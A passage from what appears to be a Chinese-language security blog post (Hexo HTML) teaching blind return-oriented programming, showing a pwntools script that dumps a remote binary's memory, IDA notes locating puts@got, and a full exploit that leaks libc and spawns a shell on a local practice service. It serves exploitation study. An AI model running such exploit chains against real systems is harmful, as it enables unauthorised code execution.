<span class="keyword">try</span>:</span><br><span class="line">		data = p.recvuntil(<span class="string">'\nWelCome'</span>)</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"data:"</span> + data[:data.index(<span class="string">"\nWelCome"</span>)]</span><br><span class="line">		data = data[:data.index(<span class="string">"\nWelCome"</span>)]</span><br><span class="line">		<span class="comment"># print "len:" + hex(len(data))</span></span><br><span class="line">		<span class="keyword">if</span> data == <span class="string">""</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'\x00'</span></span><br><span class="line">		<span class="keyword">return</span> data</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">	log.info(<span class="string">"addr--&gt;%s"</span>,hex(addr))</span><br><span class="line">	data = leak(<span class="number">72</span>,pop_rdi,puts_plt,addr,stop_gadget)</span><br><span class="line">	<span class="keyword">if</span> data == <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	res += data</span><br><span class="line">	addr += len(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"dump"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(res)</span><br><span class="line">log.success(<span class="string">"dump finish!"</span>)</span><br><span class="line"></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>需要注意的是：这里用puts函数来泄露程序 ，如何我们接收到的是””，说明遇到了’\x00’。</p>
+</blockquote>
+<p>接下来用IDA打开程序 <code>edit -&gt; segments -&gt; rebase program</code> 修改Value为<code>0x400000</code>，再找到地址<code>0x400555</code>按下 p，将数据转换成函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">seg000:0000000000400555 sub_400555      proc near</span><br><span class="line">seg000:0000000000400555                 add     bh, bh</span><br><span class="line">seg000:0000000000400557                 and     eax, 200AB4h</span><br><span class="line">seg000:000000000040055C                 nop     dword ptr [rax+00h]</span><br><span class="line">seg000:0000000000400560                 jmp     qword ptr cs:601018h</span><br><span class="line">seg000:0000000000400560 sub_400555      endp</span><br></pre></td></tr></table></figure>
+<p>得到<code>puts@got = 0x601018</code>，当然，如果用地址<code>0x400560</code>生成函数的话就理直接了，这就跟正常程序中的got表一模一样了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seg000:0000000000400560 sub_400560      proc near</span><br><span class="line">seg000:0000000000400560                 jmp     qword ptr cs:601018h</span><br><span class="line">seg000:0000000000400560 sub_400560      endp</span><br></pre></td></tr></table></figure>
+<p>之所以地址<code>0x400555</code>和<code>0x400560</code>都可以成功调用<code>puts@plt</code>，是因为<code>jmp qword ptr cs:601018h</code>前面的几句汇编对程序影响不大，最后程序还是会正常跳到<code>puts@got</code>，所以这两个地址效果是一样的</p>
+<h3 id="6、get-shell"><a href="#6、get-shell" class="headerlink" title="6、get shell"></a>6、get shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 6</span></span><br><span class="line"><span class="comment"># get_shell</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>,<span class="string">"7777"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">72</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)</span><br><span class="line">sda(<span class="string">"password?\n"</span>,pay)</span><br><span class="line">puts_addr = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line">log.info(<span class="string">"puts_addr--&gt;%s"</span>,hex(puts_addr))</span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">72</span> + p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">sda(<span class="string">"password?\n"</span>,pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/21/AFL源码分析计划3/" rel="next" title="AFL源码分析计划3 -- afl-as.h">
+                <i class="fa fa-chevron-left"></i> AFL源码分析计划3 -- afl-as.h
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/06/21/bytectf/" rel="prev" title="bytectf部分wp">
+                bytectf部分wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/n0va.jpg" alt="R4bb1t">
+            
+              <p class="site-author-name" itemprop="name">R4bb1t</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xi4or0uji.github.io/" title="Xi4or0uji" target="_blank">Xi4or0uji</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://gdufs-king.github.io/" title="V1ctor" target="_blank">V1ctor</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://z3r3f.gitee.io/" title="23r3f" target="_blank">23r3f</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://zszcr.github.io/" title="zs0zrc" target="_blank">zs0zrc</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://dittozzz.top/" title="ditto" target="_blank">ditto</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ch4r1l3.github.io/" title="ch4r1l3" target="_blank">ch4r1l3</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://nightrainy.github.io/" title="知世" target="_blank">知世</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#写在前面"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BROP攻击的目标和前提条件"><span class="nav-number">2.</span> <span class="nav-text">BROP攻击的目标和前提条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BROP的攻击流程"><span class="nav-number">3.</span> <span class="nav-text">BROP的攻击流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#远程dump内存"><span class="nav-number">3.1.</span> <span class="nav-text">远程dump内存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻破Stack-Canaries保护"><span class="nav-number">3.2.</span> <span class="nav-text">攻破Stack Canaries保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找stop-gadget"><span class="nav-number">3.3.</span> <span class="nav-text">寻找stop gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找brop-gadget"><span class="nav-number">3.4.</span> <span class="nav-text">寻找brop_gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找plt项"><span class="nav-number">3.5.</span> <span class="nav-text">寻找plt项</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#控制-RDX"><span class="nav-number">3.6.</span> <span class="nav-text">控制 RDX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找输出函数"><span class="nav-number">3.7.</span> <span class="nav-text">寻找输出函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#寻找put-plt"><span class="nav-number">3.7.1.</span> <span class="nav-text">寻找put@plt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#寻找write-plt"><span class="nav-number">3.7.2.</span> <span class="nav-text">寻找write@plt</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#回到最初的目的——dump-文件"><span class="nav-number">3.8.</span> <span class="nav-text">回到最初的目的——dump 文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例子"><span class="nav-number">4.</span> <span class="nav-text">例子</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、确定栈溢出长度"><span class="nav-number">4.1.</span> <span class="nav-text">1、确定栈溢出长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、寻找gadget"><span class="nav-number">4.2.</span> <span class="nav-text">2、寻找gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、寻找brop-gadget"><span class="nav-number">4.3.</span> <span class="nav-text">3、寻找brop_gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、确定puts-plt地址"><span class="nav-number">4.4.</span> <span class="nav-text">4、确定puts@plt地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5、dump文件"><span class="nav-number">4.5.</span> <span class="nav-text">5、dump文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6、get-shell"><span class="nav-number">4.6.</span> <span class="nav-text">6、get shell</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">R4bb1t</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
